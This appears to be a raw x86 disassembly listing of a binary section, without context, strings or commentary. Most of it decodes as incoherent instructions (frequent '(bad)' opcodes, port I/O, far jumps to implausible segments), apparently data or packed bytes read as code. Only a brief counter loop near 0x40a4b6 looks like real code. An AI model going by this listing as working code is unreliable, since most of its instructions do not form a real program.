  409ec9:	aad    0x8b
  409ecb:	push   cs
  409ecc:	idiv   eax
  409ece:	fnstenv [ebx+0x4f6c7a2]
  409ed4:	add    al,0xdd
  409ed6:	aas    
  409ed7:	cmp    ebx,esi
  409ed9:	aas    
  409eda:	and    al,0x73
  409edc:	cmp    eax,0xd9482ab2
  409ee1:	push   ebp
  409ee2:	loope  0x409f3e
  409ee4:	(bad)  
  409ee5:	ins    DWORD PTR es:[edi],dx
  409ee6:	adc    ch,0x84
  409ee9:	pop    ebx
  409eea:	push   ss
  409eeb:	repnz popf 
  409eed:	fst    QWORD PTR [ecx*2+0x782d2e]
  409ef4:	push   cs
  409ef5:	xchg   DWORD PTR [ebp+edx*1+0x42],esi
  409ef9:	(bad)  
  409efa:	adc    esp,eax
  409efc:	mov    esi,0x39cd4704
  409f01:	shr    edx,cl
  409f03:	xchg   BYTE PTR [ebx+0x2222b15f],cl
  409f09:	jb     0x409f81
  409f0b:	adc    al,0x4b
  409f0d:	je     0x409ef3
  409f0f:	out    0x62,al
  409f11:	adc    ch,BYTE PTR [edx+0x77bfcf14]
  409f17:	mov    eax,cs:0x857db65d
  409f1d:	push   ecx
  409f1e:	pop    es
  409f1f:	adc    al,dl
  409f21:	jae    0x409eab
  409f23:	adc    eax,0x6dd46155
  409f28:	sahf   
  409f29:	pcmpeqb mm7,QWORD PTR [edi-0x2e58382d]
  409f30:	fcmove st,st(3)
  409f32:	test   BYTE PTR [eax+ebx*1+0x70911396],0x44
  409f3a:	mov    DWORD PTR [esi+0x7c],ecx
  409f3d:	scas   al,BYTE PTR es:[edi]
  409f3e:	pop    eax
  409f3f:	adc    ebp,esp
  409f41:	pusha  
  409f42:	es sub bl,ah
  409f45:	cdq    
  409f46:	cmp    dl,BYTE PTR [ecx]
  409f48:	rcr    BYTE PTR [ebp+0x5d94fe09],0xe1
  409f4f:	outs   dx,DWORD PTR ds:[esi]
  409f50:	mov    cl,0x93
  409f52:	mov    cl,0x9
  409f54:	call   0x8f640b18
  409f59:	mov    ebp,0xcedd4f69
  409f5e:	dec    esp
  409f5f:	dec    edx
  409f60:	mov    eax,0x3d5897e8
  409f65:	xor    DWORD PTR [edx],0x52
  409f68:	mov    WORD PTR [edi-0x40],?
  409f6b:	inc    esi
  409f6c:	sbb    al,cl
  409f6e:	xlat   BYTE PTR ds:[ebx]
  409f6f:	(bad)  
  409f70:	pop    eax
  409f71:	jbe    0x409fe3
  409f73:	adc    DWORD PTR [esi-0xf],0x25
  409f77:	pop    ebp
  409f78:	sub    dh,dh
  409f7a:	mov    ebp,0x102f7967
  409f7f:	imul   DWORD PTR [edx-0x1b]
  409f82:	jecxz  0x409f3e
  409f84:	push   0x2c
  409f86:	(bad)  
  409f87:	pop    ss
  409f88:	xchg   al,bl
  409f8a:	jb     0x40a005
  409f8c:	in     eax,dx
  409f8d:	fsub   QWORD PTR [ecx]
  409f8f:	and    al,0x98
  409f91:	and    al,0x9a
  409f93:	or     edx,ecx
  409f95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f96:	mov    cl,0xb3
  409f98:	aas    
  409f99:	aaa    
  409f9a:	mul    DWORD PTR ds:0x5bfa20dc
  409fa0:	adc    DWORD PTR [edx-0xe],esi
  409fa3:	out    0x89,eax
  409fa5:	mov    eax,ds:0x37544a22
  409faa:	iret   
  409fab:	xchg   ebx,eax
  409fac:	mov    ah,BYTE PTR [edx+esi*2]
  409faf:	mov    bl,0xa8
  409fb1:	xchg   esi,ebx
  409fb3:	popf   
  409fb4:	push   eax
  409fb5:	out    0xb3,eax
  409fb7:	jecxz  0x409fe7
  409fb9:	mov    ds:0x299ed47e,al
  409fbe:	out    0x94,eax
  409fc0:	sub    al,0x7d
  409fc2:	inc    esp
  409fc3:	pop    ebp
  409fc4:	sbb    BYTE PTR [ebx],0xb8
  409fc7:	pop    ebx
  409fc8:	jae    0x40a011
  409fca:	inc    ebx
  409fcb:	mov    edx,0xfe033972
  409fd0:	pusha  
  409fd1:	mov    ds:0xf4b6968c,al
  409fd6:	aas    
  409fd7:	inc    eax
  409fd8:	retf   
  409fd9:	pop    ecx
  409fda:	push   eax
  409fdb:	popa   
  409fdc:	scas   eax,DWORD PTR es:[edi]
  409fdd:	adc    al,0xac
  409fdf:	rcl    BYTE PTR ds:0xc0df5ccc,cl
  409fe5:	adc    eax,0xa1cc5b9e
  409fea:	xor    ebp,ebp
  409fec:	lods   eax,DWORD PTR ds:[esi]
  409fed:	lock push eax
  409fef:	cmp    ch,cl
  409ff1:	pop    edi
  409ff2:	sub    al,0x7c
  409ff4:	jno    0x409fdb
  409ff6:	and    al,0x70
  409ff8:	and    bh,BYTE PTR [edi]
  409ffa:	mov    dl,0x39
  409ffd:	jl     0x40a07c
  409fff:	sbb    ecx,edi
  40a001:	scas   eax,DWORD PTR es:[edi]
  40a002:	ret    
  40a003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a004:	cmp    eax,0xf71d86fa
  40a009:	(bad)  
  40a00a:	aam    0x6f
  40a00c:	mov    ebx,0x94f50c28
  40a011:	cdq    
  40a012:	lea    esi,[edi-0x53adb153]
  40a018:	xchg   dl,bl
  40a01a:	jg     0x40a04c
  40a01c:	dec    eax
  40a01d:	lahf   
  40a01e:	inc    ecx
  40a01f:	das    
  40a020:	push   esp
  40a021:	pop    es
  40a022:	push   cs
  40a023:	lods   eax,DWORD PTR ds:[esi]
  40a024:	pop    es
  40a025:	xchg   edi,eax
  40a026:	aam    0xa1
  40a028:	inc    esi
  40a029:	mov    bl,0xcf
  40a02b:	fst    QWORD PTR [esp+ebp*1+0xf03031d]
  40a032:	ror    DWORD PTR [esi+0x24],cl
  40a035:	pop    es
  40a036:	sub    ebx,ebx
  40a038:	pop    es
  40a039:	inc    ebx
  40a03a:	mov    bh,0xbf
  40a03c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a03d:	cmp    BYTE PTR [edi+ebx*2+0x6079f17e],0x7c
  40a045:	fwait
  40a046:	pushf  
  40a047:	mov    es,edx
  40a049:	xchg   esp,eax
  40a04a:	cs pop edx
  40a04c:	test   al,0x1b
  40a04e:	mov    cl,0x2d
  40a050:	add    edi,DWORD PTR [ebx-0x7526ccc9]
  40a056:	xor    BYTE PTR [edi-0x72],ch
  40a059:	mov    eax,ds:0x1e72c5fa
  40a05e:	ret    0xc7d8
  40a061:	cli    
  40a062:	es add eax,ebx
  40a065:	add    al,0x4
  40a067:	fcomp  DWORD PTR [ebx-0x35315c55]
  40a06d:	push   edx
  40a06e:	call   FWORD PTR [ecx+0xa43b0ca]
  40a074:	xchg   ebx,eax
  40a075:	jae    0x40a0f5
  40a077:	ret    
  40a078:	mov    BYTE PTR [edx+0x293d0c93],bh
  40a07e:	rcl    BYTE PTR [esi+0x0],cl
  40a081:	inc    esp
  40a082:	jno    0x40a026
  40a084:	xchg   ebp,eax
  40a085:	add    BYTE PTR [edi-0x19],dh
  40a088:	sub    cl,BYTE PTR [edi*4-0x2445e28e]
  40a08f:	imul   edi,DWORD PTR [esi],0xbbcf75a9
  40a095:	test   al,0xca
  40a097:	call   DWORD PTR [esi+0x5d7f83e]
  40a09d:	in     al,dx
  40a09e:	push   0x6b
  40a0a0:	jl     0x40a112
  40a0a2:	jmp    edx
  40a0a4:	xlat   BYTE PTR ds:[ebx]
  40a0a5:	sub    BYTE PTR [ebx],0x9c
  40a0a8:	loop   0x40a0ff
  40a0aa:	mov    esp,0xcd252bb
  40a0af:	leave  
  40a0b0:	cmp    BYTE PTR [edi+0x1b],0x77
  40a0b4:	sar    BYTE PTR [edx],0x9e
  40a0b7:	aas    
  40a0b8:	jb     0x40a098
  40a0ba:	add    edx,0x4b
  40a0bd:	lock mov dh,0xa4
  40a0c0:	mov    eax,ds:0x8ea404e
  40a0c5:	xchg   esp,eax
  40a0c6:	test   DWORD PTR [esp+ebp*1],edx
  40a0c9:	es xchg esp,eax
  40a0cb:	into   
  40a0cc:	push   esi
  40a0cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0ce:	xor    eax,0x42948329
  40a0d3:	mov    al,ds:0xe98d6f47
  40a0d8:	(bad)  
  40a0d9:	mov    dh,0x3a
  40a0db:	fidivr DWORD PTR [esi-0x39026cc9]
  40a0e1:	inc    edi
  40a0e2:	jmp    0x40a0db
  40a0e4:	xchg   esp,eax
  40a0e5:	push   edx
  40a0e6:	shr    BYTE PTR [eax+0x1272e309],cl
  40a0ec:	in     eax,dx
  40a0ed:	out    dx,eax
  40a0ee:	or     al,0x7f
  40a0f0:	adc    BYTE PTR [eax-0x2dfae57d],bh
  40a0f6:	mov    dh,0xd1
  40a0f8:	out    0x7a,al
  40a0fa:	adc    BYTE PTR [ecx+0x3a3c3fb9],0x4
  40a101:	push   esi
  40a102:	adc    DWORD PTR [ebp-0x5a516ee8],eax
  40a108:	das    
  40a109:	std    
  40a10a:	xchg   esi,eax
  40a10b:	inc    edx
  40a10c:	dec    edi
  40a10d:	outs   dx,DWORD PTR ds:[esi]
  40a10e:	add    eax,0x5021188f
  40a113:	fld    DWORD PTR [esi-0x7c049f7e]
  40a119:	pop    esp
  40a11a:	add    DWORD PTR [eax],esp
  40a11c:	imul   edi,DWORD PTR [ebx-0x47],0x4c1ed8b8
  40a123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a124:	cdq    
  40a125:	fwait
  40a126:	outs   dx,BYTE PTR ds:[esi]
  40a127:	arpl   bp,dx
  40a129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a12a:	and    cl,al
  40a12c:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40a12e:	xchg   edx,eax
  40a12f:	test   al,0xa0
  40a131:	xlat   BYTE PTR ds:[ebx]
  40a132:	lea    ebp,[esp+edx*2]
  40a135:	adc    DWORD PTR [edx],eax
  40a137:	jle    0x40a10e
  40a139:	inc    edx
  40a13a:	pop    ds
  40a13b:	rol    DWORD PTR [edi-0x14],cl
  40a13e:	rcl    BYTE PTR [ecx-0x1979bb16],1
  40a144:	enter  0xeaec,0x17
  40a148:	cmp    al,0xab
  40a14a:	pop    ebx
  40a14b:	mov    al,ds:0xbcb10faa
  40a150:	call   0x8705:0x663be27
  40a157:	push   ebp
  40a158:	sub    eax,0xbf8d5a9
  40a15d:	inc    eax
  40a15e:	xor    BYTE PTR [esp+ecx*4+0xc8959a4],dh
  40a165:	sbb    BYTE PTR [ebx],dh
  40a167:	(bad)  
  40a168:	jmp    0x40a4b5
  40a16d:	push   ebp
  40a16e:	or     ah,al
  40a170:	int3   
  40a171:	popa   
  40a172:	hlt    
  40a173:	jno    0x40a108
  40a175:	jae    0x40a11f
  40a177:	and    dh,ah
  40a179:	retf   
  40a17a:	inc    edx
  40a17b:	jae    0x40a172
  40a17d:	cmp    edi,esp
  40a17f:	jle    0x40a1ff
  40a181:	cs jge 0x40a202
  40a184:	jle    0x40a17a
  40a186:	inc    edi
  40a187:	pop    eax
  40a188:	jb     0x40a146
  40a18a:	jmp    0x26e2:0xbdbc5468
  40a191:	ins    BYTE PTR es:[edi],dx
  40a192:	xor    DWORD PTR [edi],edi
  40a194:	mov    al,0xd8
  40a196:	add    eax,0x7e501592
  40a19b:	mov    ecx,0x7289311c
  40a1a0:	jg     0x40a13d
  40a1a2:	adc    DWORD PTR [ebp+0x143042c0],edi
  40a1a8:	dec    ebx
  40a1a9:	mov    dh,0x45
  40a1ab:	or     edx,DWORD PTR [ebx-0x8d2aaa7]
  40a1b1:	pop    edx
  40a1b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1b3:	shl    BYTE PTR [ebx-0x469a00a7],cl
  40a1b9:	lea    eax,[ebx+eax*8+0x3cd766e9]
  40a1c0:	jle    0x40a1fe
  40a1c2:	loope  0x40a201
  40a1c4:	punpcklwd mm7,DWORD PTR [esi+0x1]
  40a1c8:	test   DWORD PTR [edi+0x77],ebx
  40a1cb:	adc    DWORD PTR [ebp-0x1030dae9],esi
  40a1d1:	mov    dl,0x16
  40a1d3:	add    al,0x62
  40a1d5:	jae    0x40a1d5
  40a1d7:	push   eax
  40a1d8:	mov    eax,0x89d3edf1
  40a1dd:	adc    dl,BYTE PTR [eax-0x23c9077d]
  40a1e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1e4:	rcr    BYTE PTR ds:0x38c4c17c,0xa1
  40a1eb:	sub    al,0x1c
  40a1ed:	mov    edx,0x799ac881
  40a1f2:	xchg   DWORD PTR [edi+0x2b],eax
  40a1f5:	cmp    cl,BYTE PTR [ebp-0xc]
  40a1f8:	outs   dx,BYTE PTR ds:[esi]
  40a1f9:	mov    bh,0x44
  40a1fb:	sub    ebx,edx
  40a1fd:	mov    edx,edi
  40a1ff:	jns    0x40a1c2
  40a201:	dec    esp
  40a202:	jmp    0x3214:0xed685005
  40a209:	rcr    DWORD PTR [edi-0x373cfd5e],1
  40a20f:	fadd   st,st(2)
  40a211:	add    al,dh
  40a213:	mov    al,0xd0
  40a215:	inc    ebx
  40a216:	int3   
  40a217:	sub    al,0x7
  40a219:	dec    esp
  40a21a:	mov    DWORD PTR [eax],edi
  40a21c:	aas    
  40a21d:	add    cl,BYTE PTR [ecx-0x49]
  40a220:	mov    bl,0x15
  40a222:	xchg   ebx,eax
  40a223:	xchg   ecx,eax
  40a224:	leave  
  40a225:	pop    ds
  40a226:	jmp    0x80ea:0x89e67674
  40a22d:	and    ah,BYTE PTR ds:0x17d1cce3
  40a233:	fadd   DWORD PTR [edi-0x241242d9]
  40a239:	mov    edi,DWORD PTR [ecx]
  40a23b:	xor    eax,0xdd68a4bb
  40a240:	push   ss
  40a241:	jmp    0x89d5:0x6f8cf966
  40a248:	sub    ebp,esp
  40a24a:	mov    bl,0xa3
  40a24c:	outs   dx,BYTE PTR ds:[esi]
  40a24d:	and    BYTE PTR [edi-0x4],bl
  40a250:	and    ah,BYTE PTR [ecx+0x34034543]
  40a256:	stos   BYTE PTR es:[edi],al
  40a257:	loope  0x40a2b5
  40a259:	push   0xffffffb3
  40a25b:	lods   al,BYTE PTR ds:[esi]
  40a25c:	stos   DWORD PTR es:[edi],eax
  40a25d:	adc    BYTE PTR [eax],0xfd
  40a260:	test   DWORD PTR [edx],ebx
  40a262:	inc    esp
  40a263:	sti    
  40a264:	inc    ebp
  40a265:	ficomp WORD PTR [ebp+0x10cfd97a]
  40a26b:	std    
  40a26c:	xchg   ecx,eax
  40a26d:	les    edx,FWORD PTR [eax-0x1e]
  40a270:	xchg   esi,eax
  40a271:	movntq QWORD PTR [esi-0x1fee6b89],mm7
  40a278:	(bad)  
  40a279:	out    0xe6,eax
  40a27b:	mov    ah,0xe0
  40a27d:	pop    ecx
  40a27e:	dec    edx
  40a27f:	mov    ecx,0x37d052ed
  40a284:	fistp  WORD PTR [esi+0x44]
  40a287:	adc    eax,0x434f6627
  40a28c:	js     0x40a261
  40a28e:	xlat   BYTE PTR ds:[ebx]
  40a28f:	ret    
  40a290:	add    edi,esp
  40a292:	adc    dl,bl
  40a294:	pop    ebp
  40a295:	sbb    DWORD PTR [edi-0x3f],eax
  40a298:	push   ebx
  40a299:	add    cl,BYTE PTR ds:0xc572b569
  40a29f:	lahf   
  40a2a0:	fsubr  st(4),st
  40a2a2:	pause  
  40a2a4:	push   edi
  40a2a5:	cli    
  40a2a6:	jmp    0x40a2ec
  40a2a8:	call   0x495e:0x2a6c7d3f
  40a2af:	add    BYTE PTR [ebx-0x49],dh
  40a2b2:	xor    ch,BYTE PTR [ecx*8+0x33c85064]
  40a2b9:	scas   al,BYTE PTR es:[edi]
  40a2ba:	mov    al,ds:0xcfddd517
  40a2bf:	mov    al,0x66
  40a2c1:	push   ebp
  40a2c2:	icebp  
  40a2c3:	and    edx,ebx
  40a2c5:	call   0xb029:0x7ee4a6be
  40a2cc:	enter  0x222c,0x61
  40a2d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2d1:	loop   0x40a340
  40a2d3:	dec    edx
  40a2d4:	lods   eax,DWORD PTR ds:[esi]
  40a2d5:	or     al,0xf4
  40a2d7:	pop    esi
  40a2d8:	dec    ecx
  40a2d9:	push   0x63c89821
  40a2de:	popa   
  40a2df:	imul   edi,ebx,0xde72de01
  40a2e5:	mov    ecx,0xf1b44811
  40a2ea:	cmc    
  40a2eb:	cs push edx
  40a2ed:	sub    esp,DWORD PTR [edi+0x1f]
  40a2f0:	div    BYTE PTR [ecx]
  40a2f2:	pusha  
  40a2f3:	adc    al,0xbe
  40a2f5:	iret   
  40a2f6:	scas   eax,DWORD PTR es:[edi]
  40a2f7:	xchg   DWORD PTR [esi],eax
  40a2f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2fa:	pushf  
  40a2fb:	neg    BYTE PTR [esi-0x7a728911]
  40a301:	xor    eax,0x4bafea34
  40a306:	push   ecx
  40a307:	sub    DWORD PTR [esi+0x61c7f0e0],eax
  40a30d:	sti    
  40a30e:	in     al,0x20
  40a310:	stos   DWORD PTR es:[edi],eax
  40a311:	pop    ebx
  40a312:	xor    DWORD PTR [edi+edx*1-0x5d],edx
  40a316:	stc    
  40a317:	push   esp
  40a318:	add    BYTE PTR [edx-0x26],bh
  40a31b:	lds    eax,FWORD PTR [ebp+ebx*8-0x6f]
  40a31f:	inc    eax
  40a320:	shl    DWORD PTR [ecx],0x59
  40a323:	mov    al,0xd7
  40a325:	ficomp WORD PTR [ecx-0x60]
  40a328:	mov    esi,0x6f42c3ce
  40a32d:	inc    esp
  40a32e:	add    cl,BYTE PTR [edi+0x27]
  40a331:	in     eax,0x8e
  40a333:	xor    al,0x99
  40a335:	test   eax,0xe5ecc6e3
  40a33a:	cld    
  40a33b:	sub    eax,0xed8a7554
  40a340:	repnz sbb BYTE PTR ds:0xeef0281f,0xe
  40a348:	test   eax,0x35236793
  40a34d:	stos   BYTE PTR es:[edi],al
  40a34e:	cmp    al,0x54
  40a350:	jno    0x40a3cc
  40a352:	stos   DWORD PTR es:[edi],eax
  40a353:	dec    eax
  40a354:	mov    dh,0x91
  40a356:	js     0x40a2db
  40a358:	push   esi
  40a359:	pushf  
  40a35a:	ret    
  40a35b:	add    DWORD PTR [esi+esi*8],eax
  40a35e:	or     al,0xac
  40a360:	js     0x40a3d6
  40a362:	push   0xcdeffb29
  40a367:	daa    
  40a368:	(bad)  
  40a369:	sbb    DWORD PTR [esi+0x7a8b9bd7],ebp
  40a36f:	dec    edx
  40a370:	jne    0x40a3b4
  40a372:	ja     0x40a3e5
  40a374:	and    bh,bh
  40a376:	cmp    ebx,DWORD PTR [ecx]
  40a378:	(bad)  
  40a379:	shr    edx,0xea
  40a37c:	inc    edi
  40a37d:	cwde   
  40a37e:	inc    ecx
  40a37f:	mov    eax,0x68e58411
  40a384:	adc    bl,BYTE PTR [ebx+edi*4]
  40a387:	pop    eax
  40a388:	jge    0x40a364
  40a38a:	sbb    DWORD PTR [ecx+0x27b723e3],edi
  40a390:	jle    0x40a358
  40a392:	dec    esi
  40a393:	jnp    0x40a345
  40a395:	ret    
  40a396:	(bad)  
  40a397:	fiadd  DWORD PTR [ecx-0x4f27fa00]
  40a39d:	sahf   
  40a39e:	popa   
  40a39f:	pop    esp
  40a3a0:	pop    es
  40a3a1:	add    eax,0x7fc94bcb
  40a3a6:	or     DWORD PTR ds:0xbce24ad3,edi
  40a3ac:	xor    al,0x5a
  40a3ae:	retf   0x5799
  40a3b1:	xchg   ebp,eax
  40a3b2:	adc    BYTE PTR [esi+0x70],0x3
  40a3b6:	sbb    DWORD PTR [edx],edx
  40a3b8:	pop    esi
  40a3b9:	dec    eax
  40a3ba:	in     eax,dx
  40a3bb:	xor    BYTE PTR [ebx],dh
  40a3bd:	jns    0x40a406
  40a3bf:	std    
  40a3c0:	test   al,0x1
  40a3c2:	xor    eax,0xce0d9e9e
  40a3c7:	imul   esi,DWORD PTR [edi+0x535ec9c6],0x2d
  40a3ce:	push   0x51
  40a3d0:	xchg   edx,eax
  40a3d1:	mov    ecx,0x33d6a90
  40a3d6:	std    
  40a3d7:	leave  
  40a3d8:	xchg   ebx,eax
  40a3d9:	hlt    
  40a3da:	mov    ebp,DWORD PTR [eax-0x3cc35757]
  40a3e0:	jno    0x40a3f0
  40a3e2:	add    eax,0x1b2d3902
  40a3e7:	(bad)  
  40a3e8:	icebp  
  40a3e9:	or     al,0x61
  40a3eb:	outs   dx,DWORD PTR ds:[esi]
  40a3ec:	push   es
  40a3ed:	sahf   
  40a3ee:	dec    eax
  40a3ef:	cmp    BYTE PTR [esi+0x47704291],bl
  40a3f5:	out    0x6a,al
  40a3f7:	in     eax,dx
  40a3f8:	retf   
  40a3f9:	mov    ebx,0x71f5daa0
  40a3fe:	pop    esi
  40a3ff:	pop    ebx
  40a400:	addr16 out dx,al
  40a402:	cwde   
  40a403:	rcr    DWORD PTR [esi+ecx*8+0x36],0x5
  40a408:	imul   ecx,DWORD PTR [edi+0x35],0x99a58ffd
  40a40f:	loop   0x40a3a0
  40a411:	ror    ebx,cl
  40a413:	aad    0xfe
  40a415:	imul   esp,edi,0x89716203
  40a41b:	dec    esp
  40a41c:	clc    
  40a41d:	dec    ebx
  40a41e:	xchg   edi,eax
  40a41f:	and    al,0x37
  40a421:	call   0x2d63413
  40a426:	dec    esi
  40a427:	or     eax,0xd4de1d6b
  40a42c:	dec    edi
  40a42d:	je     0x40a45b
  40a42f:	xchg   DWORD PTR [eax-0x4ea3aca5],edx
  40a435:	push   es
  40a436:	xchg   esi,eax
  40a437:	in     eax,0x7d
  40a439:	js     0x40a3bb
  40a43b:	fs push esi
  40a43d:	add    al,0x5b
  40a43f:	cmp    DWORD PTR [ecx+ecx*8-0x74],esi
  40a443:	mov    dl,0x66
  40a445:	aam    0xb1
  40a447:	les    esi,FWORD PTR [edx-0x7e]
  40a44a:	lock dec esi
  40a44c:	add    BYTE PTR [edi],dl
  40a44e:	icebp  
  40a44f:	adc    ebx,DWORD PTR [edx]
  40a451:	pop    ss
  40a452:	xlat   BYTE PTR ds:[ebx]
  40a453:	in     al,dx
  40a454:	mul    DWORD PTR [edi]
  40a456:	mov    WORD PTR [eax],ds
  40a458:	shr    BYTE PTR [ebp+0xf106bff],0x6d
  40a45f:	aas    
  40a460:	mov    ch,0x88
  40a462:	xchg   esi,eax
  40a463:	xchg   esp,eax
  40a464:	adc    al,0x2d
  40a466:	mov    edx,0xdb1d5fb3
  40a46b:	sub    ebx,eax
  40a46d:	and    DWORD PTR [eax],0xd2b23e81
  40a473:	(bad)  
  40a475:	leave  
  40a476:	jo     0x40a45b
  40a478:	xor    al,0x84
  40a47a:	pusha  
  40a47b:	mov    eax,ds:0xc11f4b58
  40a480:	pop    edx
  40a481:	aad    0xa2
  40a483:	das    
  40a484:	repnz mov DWORD PTR [edi-0x4642a3ad],eax
  40a48b:	stc    
  40a48c:	mov    dh,0x8b
  40a48e:	and    DWORD PTR [edx-0x4a],eax
  40a491:	sbb    BYTE PTR [eax+eiz*1-0x528a7888],cl
  40a498:	lods   eax,DWORD PTR ds:[esi]
  40a499:	lods   eax,DWORD PTR ds:[esi]
  40a49a:	out    dx,al
  40a49b:	dec    ebx
  40a49c:	sahf   
  40a49d:	out    dx,eax
  40a49e:	jle    0x40a45d
  40a4a0:	jno    0x40a47a
  40a4a2:	call   0xdb09c983
  40a4a7:	call   0xc8e0:0xba11eae5
  40a4ae:	rcl    BYTE PTR [ebx],0x7b
  40a4b1:	popa   
  40a4b2:	jle    0x40a524
  40a4b4:	xor    al,BYTE PTR [ebx]
  40a4b6:	mov    DWORD PTR [ecx+0x43047125],0x0
  40a4c0:	add    BYTE PTR [ebx],dh
  40a4c2:	fisttp DWORD PTR [ebx]
  40a4c4:	sbb    eax,0x430471
  40a4c9:	inc    ebx
  40a4ca:	mov    DWORD PTR ds:0x430471,ebx
  40a4d0:	cmp    DWORD PTR ds:0x430471,0x2a
  40a4d7:	jne    0x40a4e8
  40a4dd:	push   0x43f7
  40a4e2:	call   DWORD PTR ds:0x42ec3b
  40a4e8:	cmp    DWORD PTR ds:0x430471,0x1d
  40a4ef:	jb     0x40a4c1
  40a4f5:	mov    DWORD PTR [ecx],eax
  40a4f7:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a4fe:	sub    ebx,ecx
  40a500:	jmp    0x40a84d
  40a505:	shr    BYTE PTR [esi],cl
  40a507:	mov    eax,0x736960ed
  40a50c:	xor    DWORD PTR [ebx],ebp
  40a50e:	jne    0x40a4fa
  40a510:	ss jmp 0xea0ce5c6
  40a516:	loop   0x40a596
  40a518:	jle    0x40a548
  40a51a:	jge    0x40a59a
  40a51c:	jle    0x40a585
  40a51e:	mov    esi,0x1f9647f3
  40a523:	inc    esp
  40a524:	(bad)  
  40a525:	clc    
  40a526:	cmc    
  40a527:	aam    0x1c
  40a529:	dec    esi
  40a52a:	in     al,0xd1
  40a52c:	leave  
  40a52d:	iret   
  40a52e:	scas   al,BYTE PTR es:[edi]
  40a52f:	stos   BYTE PTR es:[edi],al
  40a530:	(bad)  
  40a531:	xchg   ebp,eax
  40a532:	push   0x21
  40a534:	popa   
  40a535:	out    0x8e,al
  40a537:	loop   0x40a517
  40a539:	cmp    edx,0x6a
  40a53c:	loopne 0x40a55c
  40a53e:	pop    edx
  40a53f:	xchg   edx,eax
  40a540:	imul   edx,DWORD PTR [eax+0x6f],0x9bf67680
  40a547:	adc    DWORD PTR [ecx],ecx
  40a549:	xor    al,0x79
  40a54b:	inc    ebp
  40a54c:	mov    esp,DWORD PTR [eax]
  40a54e:	ins    DWORD PTR es:[edi],dx
  40a54f:	sbb    dl,0x1e
  40a552:	or     ch,BYTE PTR [edi]
  40a554:	adc    al,0x69
  40a556:	sar    eax,1
  40a558:	popa   
  40a559:	add    esi,DWORD PTR [ebx-0x7]
  40a55c:	pop    bp
  40a55e:	mov    esp,0xd1df69d4
  40a563:	push   0x59ad11ea
  40a568:	xor    edx,DWORD PTR [edx]
  40a56a:	mov    cl,0x9c
  40a56c:	sub    esp,edi
  40a56e:	xchg   BYTE PTR [ebx-0x6d4c8f26],dl
  40a574:	aad    0x8
  40a576:	xchg   ecx,eax
  40a577:	pushf  
  40a578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a57a:	rcl    BYTE PTR [ecx-0x304e21e0],1
  40a580:	ins    BYTE PTR es:[edi],dx
  40a581:	pop    edi
  40a582:	add    eax,0x5548f83b
  40a587:	or     esi,DWORD PTR [ebp-0x1c0aef6]
  40a58d:	sub    edi,ecx
  40a58f:	add    eax,0xd36e4fa0
  40a594:	call   0xd4e2:0x5814fb07
  40a59b:	jp     0x40a5e0
  40a59d:	mov    ss,eax
  40a59f:	xor    DWORD PTR [esi],0x3e0dad25
  40a5a5:	pop    ss
  40a5a6:	mov    bl,0x22
  40a5a8:	into   
  40a5a9:	(bad)  
  40a5aa:	pop    edi
  40a5ab:	dec    ebp
  40a5ac:	fiadd  WORD PTR [eax-0x38]
  40a5af:	jno    0x40a58a
  40a5b1:	je     0x40a558
  40a5b3:	rol    BYTE PTR [edx-0x6],1
  40a5b6:	inc    ecx
  40a5b7:	iret   
  40a5b8:	ins    BYTE PTR es:[edi],dx
  40a5b9:	cmp    bl,BYTE PTR [edx+0x38]
  40a5bc:	in     eax,dx
  40a5bd:	sub    eax,0x622793ac
  40a5c2:	mov    al,ds:0xef6a1886
  40a5c7:	inc    DWORD PTR [ecx-0x52]
  40a5ca:	iret   
  40a5cb:	inc    ebx
  40a5cc:	pop    esp
  40a5cd:	aaa    
  40a5ce:	bound  ebp,QWORD PTR [edx+0x2265ef51]
  40a5d4:	cmc    
  40a5d5:	not    BYTE PTR [edi]
  40a5d7:	fiadd  WORD PTR [ebx]
  40a5d9:	jo     0x40a63c
  40a5db:	pop    edi
  40a5dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5dd:	push   cs
  40a5de:	out    0x92,al
  40a5e0:	pop    edi
  40a5e1:	dec    eax
  40a5e2:	pop    ebp
  40a5e3:	movups xmm6,xmm1
  40a5e6:	jle    0x40a584
  40a5e8:	lea    edx,[esp+edx*1-0x378a1e02]
  40a5ef:	or     DWORD PTR [eax-0x57d61886],ecx
  40a5f5:	mov    eax,ds:0xdbc80e50
  40a5fa:	dec    esp
  40a5fb:	arpl   WORD PTR fs:[esi-0x3a],ax
  40a5ff:	addr16 pop ebp
  40a601:	out    0x49,al
  40a603:	fwait
  40a604:	outs   dx,DWORD PTR ds:[esi]
  40a605:	sbb    ah,ah
  40a607:	xor    eax,0xadeb8eb1
  40a60c:	(bad)  
  40a60d:	jns    0x40a619
  40a60f:	add    ah,bh
  40a611:	push   ecx
  40a612:	arpl   WORD PTR [esi+0x7f10d366],sp
  40a618:	stos   DWORD PTR es:[edi],eax
  40a619:	adc    eax,0xb24a9fc3
  40a61e:	cmc    
  40a61f:	sbb    al,0x30
  40a621:	inc    esi
  40a622:	cmp    bh,BYTE PTR [ebx-0x53]
  40a625:	adc    ebp,DWORD PTR [edi+0x39]
  40a628:	imul   esi,DWORD PTR [ebx+0x6a8cf5a5],0xffffff89
  40a62f:	pop    ecx
  40a630:	mov    ds:0x8cb44ef0,eax
  40a635:	scas   ax,WORD PTR es:[edi]
  40a637:	mov    WORD PTR [edx+eax*2-0x4],gs
  40a63b:	jmp    0xea6d:0x8b003c92
  40a642:	stos   DWORD PTR es:[edi],eax
  40a643:	xchg   ebx,eax
  40a644:	xchg   ebx,eax
  40a645:	and    BYTE PTR [ebx-0x52e31c0e],0xdf
  40a64c:	pop    ds
  40a64d:	jb     0x40a5e7
